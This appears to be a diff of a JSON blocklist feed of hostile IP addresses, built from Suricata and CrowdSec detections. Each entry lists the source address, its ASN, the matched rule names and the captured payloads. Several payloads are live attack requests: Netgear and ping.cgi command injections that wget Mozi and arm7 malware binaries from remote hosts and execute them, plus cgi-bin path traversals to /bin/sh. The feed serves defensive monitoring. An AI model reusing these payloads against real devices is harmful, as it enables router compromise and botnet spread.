@@ -1,186 +1,13 @@
 {
-  "generated_at": "2026-05-06T01:00:00Z",
+  "generated_at": "2026-05-06T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 68,
-    "v4": 68,
+    "total": 60,
+    "v4": 60,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "223.123.72.70",
-      "family": "v4",
-      "first_seen": "2026-04-29T04:00:00Z",
-      "last_seen": "2026-04-29T04:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "59257",
-      "asn_name": "CMPAKLIMITED-AS-AP CMPak Limited",
-      "asn_prefix": "223.123.72.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://223.123.72.70:38005/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.123.72.70:38005/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "103.237.157.160",
-      "family": "v4",
-      "first_seen": "2026-04-29T03:00:00Z",
-      "last_seen": "2026-04-29T03:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "132934",
-      "asn_name": "SKYMAX-AS Skymax Broadband Services Pvt. Ltd.",
-      "asn_prefix": "103.237.156.0/22",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.237.157.160:39938/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.237.157.160:39938/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "94.26.106.206",
-      "family": "v4",
-      "first_seen": "2026-04-29T08:00:00Z",
-      "last_seen": "2026-04-29T08:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 12"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "215607",
-      "asn_name": "DF-Transit dataforest GmbH",
-      "asn_prefix": "94.26.106.0/24"
-    },
-    {
-      "ip": "40.124.175.233",
-      "family": "v4",
-      "first_seen": "2026-04-29T03:00:00Z",
-      "last_seen": "2026-04-29T03:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "40.124.0.0/16",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /hudson"
-      ]
-    },
-    {
-      "ip": "45.33.12.122",
-      "family": "v4",
-      "first_seen": "2026-04-29T03:00:00Z",
-      "last_seen": "2026-04-29T03:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "63949",
-      "asn_name": "AKAMAI-LINODE-AP Akamai Connected Cloud",
-      "asn_prefix": "45.33.0.0/19",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "172.189.127.8",
-      "family": "v4",
-      "first_seen": "2026-04-29T03:00:00Z",
-      "last_seen": "2026-04-29T03:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "172.160.0.0/11",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /c/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.350.0_270f20341093f21f716d3b9044eb34ed38ecc8a0.exe?cacheHostOrigin=2.au.download.windowsupdate.com"
-      ]
-    },
-    {
-      "ip": "185.243.5.246",
-      "family": "v4",
-      "first_seen": "2026-04-29T02:00:00Z",
-      "last_seen": "2026-04-29T02:00:00Z",
-      "scenarios": [
-        "suricata/ET EXPLOIT Mikrotik Winbox RCE Attempt (CVE-2018-14847)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "23470",
-      "asn_name": "RELIABLESITE - ReliableSite.Net LLC",
-      "asn_prefix": "185.243.5.0/24"
-    },
-    {
-      "ip": "40.124.174.148",
-      "family": "v4",
-      "first_seen": "2026-04-29T02:00:00Z",
-      "last_seen": "2026-04-29T02:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "40.124.0.0/16",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "152.32.255.94",
-      "family": "v4",
-      "first_seen": "2026-04-29T08:00:00Z",
-      "last_seen": "2026-04-29T08:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "135377",
-      "asn_name": "UCLOUD-HK-AS-AP UCLOUD INFORMATION TECHNOLOGY HK LIMITED",
-      "asn_prefix": "152.32.255.0/24",
-      "payloads": [
-        "\u00033.\\xe0Cookie: mstshash=Administrator"
-      ]
-    },
     {
       "ip": "103.203.57.3",
       "family": "v4",
@@ -937,6 +764,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -955,6 +785,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.0.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -973,6 +806,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "215607",
+      "asn_name": "DF-Transit dataforest GmbH",
+      "asn_prefix": "31.58.144.0/24",
       "payloads": [
         "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
         "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
@@ -988,7 +824,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "9498",
+      "asn_name": "BBIL-AP BHARTI Airtel Ltd.",
+      "asn_prefix": "125.20.210.0/24"
     },
     {
       "ip": "142.93.233.37",
@@ -1001,6 +840,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "142.93.224.0/20",
       "payloads": [
         "POST /"
       ]
@@ -1016,6 +858,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP Cyber Internet Services Pvt Ltd.",
+      "asn_prefix": "144.48.132.0/24",
       "payloads": [
         "POST /GponForm/diag_Form?images/"
       ]
@@ -1031,6 +876,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.160.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -1049,6 +897,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "19318",
+      "asn_name": "IS-AS-1 - Interserver, Inc",
+      "asn_prefix": "155.2.192.0/24",
       "payloads": [
         "POST /"
       ]
@@ -1067,6 +918,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP Cyber Internet Services Pvt Ltd.",
+      "asn_prefix": "206.135.174.0/24",
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://206.135.174.31:42335/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://206.135.174.31:42335/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
@@ -1083,6 +937,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8560",
+      "asn_name": "IONOS-AS IONOS SE",
+      "asn_prefix": "87.106.91.0/24",
       "payloads": [
         "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
         "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
@@ -1099,6 +956,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "14618",
+      "asn_name": "AMAZON-AES - Amazon.com",
+      "asn_prefix": "44.192.0.0/11",
       "tags": [
         "mwl:cloud=\"aws\""
       ]
@@ -1114,6 +974,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.9.0.0/16",
       "tags": [
         "mwl:cloud=\"gcp\""
       ],
@@ -1132,6 +995,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "63949",
+      "asn_name": "AKAMAI-LINODE-AP Akamai Connected Cloud",
+      "asn_prefix": "66.228.56.0/21",
       "payloads": [
         "GET /"
       ]
@@ -1146,7 +1012,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "49870",
+      "asn_name": "AS49870-BV - Alsycon B.V.",
+      "asn_prefix": "160.119.76.0/23"
     },
     {
       "ip": "172.105.158.119",
@@ -1159,6 +1028,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "63949",
+      "asn_name": "AKAMAI-LINODE-AP Akamai Connected Cloud",
+      "asn_prefix": "172.105.152.0/21",
       "payloads": [
         "Gh0st\\xad\\xe0x\\x9cKS``\\x98\\xc3\\xc0\\xc0\\xc0\u0006\\xc4\\x8c@\\xbcQ\\x96\\x81\\x81 H\u0007\\xa7\u0016\\x95e&\\xa7*\u0004$&g+\u00182\\x94\\xf6\\xb000\\xac\\xa8rc\u0001\u0011\\xa0\\x82\u001f\\`&\\x83\\xc7K7\\x86\u0019\\xe5n"
       ]
@@ -1174,6 +1046,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "16509",
+      "asn_name": "AMAZON-02 - Amazon.com",
+      "asn_prefix": "3.131.0.0/16",
       "tags": [
         "mwl:cloud=\"aws\""
       ]
@@ -1189,6 +1064,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "22773",
+      "asn_name": "ASN-CXA-ALL-CCI-22773-RDC - Cox Communications Inc.",
+      "asn_prefix": "70.176.0.0/16",
       "payloads": [
         "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039"
       ]
@@ -1204,8 +1082,26 @@
       "sources": [
         "suricata"
       ],
+      "asn": "25369",
+      "asn_name": "BANDWIDTH-AS - Hydra Communications Ltd",
+      "asn_prefix": "85.204.70.0/24",
       "payloads": [
         "GET /wp-includes/wlwmanifest.xml"
+      ]
+    },
+    {
+      "ip": "185.213.175.72",
+      "family": "v4",
+      "first_seen": "2026-05-06T01:00:00Z",
+      "last_seen": "2026-05-06T01:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN DuckDuckGo Webcrawler User-Agent (DuckDuckBot)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "GET /"
       ]
     }
   ]
